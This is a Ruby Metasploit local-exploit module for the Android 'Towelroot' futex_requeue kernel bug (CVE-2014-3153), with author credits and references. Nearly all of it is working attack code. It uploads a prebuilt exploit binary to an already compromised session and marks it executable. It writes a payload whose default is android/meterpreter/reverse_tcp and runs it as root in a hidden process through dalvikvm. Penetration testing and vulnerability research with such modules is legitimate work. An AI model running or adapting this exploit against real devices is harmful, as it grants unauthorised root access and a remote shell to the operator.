##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'rex'

class MetasploitModule < Msf::Exploit::Local
  Rank = ExcellentRanking

  include Msf::Post::File
  include Msf::Post::Common

  def initialize(info={})
    super( update_info( info, {
        'Name'          => "Android 'Towelroot' Futex Requeue Kernel Exploit",
        'Description'   => %q{
            This module exploits a bug in futex_requeue in the Linux kernel, using
            similiar techniques employed by the towelroot exploit. Any Android device
            with a kernel built before June 2014 is likely to be vulnerable.
        },
        'License'       => MSF_LICENSE,
        'Author'        => [
            'Pinkie Pie', # discovery
            'geohot',     # towelroot
            'timwr'       # metasploit module
        ],
        'References'    =>
        [
            [ 'CVE', '2014-3153' ],
            [ 'URL', 'http://tinyhack.com/2014/07/07/exploiting-the-futex-bug-and-uncovering-towelroot/' ],
            [ 'URL', 'http://blog.nativeflow.com/the-futex-vulnerability' ],
        ],
        'SessionTypes'  => [ 'meterpreter' ],
        'Platform'       => 'android',
        'Targets'        => [[ 'Automatic', { }]],
        'Arch'           => ARCH_DALVIK,
        'DefaultOptions' =>
          {
            'PAYLOAD'  => 'android/meterpreter/reverse_tcp',
          },
        'DefaultTarget' => 0,
        'DisclosureDate' => "May 03 2014"
      }
    ))

    register_options([
        OptString.new("WritableDir", [ true, "Temporary directory to write files", "/data/local/tmp/" ]),
    ], self.class)
  end

  def put_local_file(remotefile)
    localfile = File.join( Msf::Config.data_directory, "exploits", "CVE-2014-3153.elf" )
    data = File.read(localfile, {:mode => 'rb'})
    write_file(remotefile, data)
  end

  def exploit
    workingdir = session.fs.dir.getwd
    exploitfile = "#{workingdir}/#{Rex::Text::rand_text_alpha_lower(5)}"
    payloadfile = "#{workingdir}/#{Rex::Text::rand_text_alpha_lower(5)}"

    put_local_file(exploitfile)
    cmd_exec('/system/bin/chmod 700 ' + exploitfile)
    write_file(payloadfile, payload.raw)

    tmpdir = datastore['WritableDir']
    rootclassdir = "#{tmpdir}#{Rex::Text::rand_text_alpha_lower(5)}"
    rootpayload = "#{tmpdir}#{Rex::Text::rand_text_alpha_lower(5)}.jar"

    rootcmd = " mkdir #{rootclassdir} && "
    rootcmd += "cd #{rootclassdir} && "
    rootcmd += "cp " + payloadfile + " #{rootpayload} && "
    rootcmd += "chmod 766 #{rootpayload} && "
    rootcmd += "dalvikvm -Xbootclasspath:/system/framework/core.jar -cp #{rootpayload} com.metasploit.stage.Payload"

    process = session.sys.process.execute(exploitfile, rootcmd, {'Hidden' => true, 'Channelized' => true})
    process.channel.read
  end

end

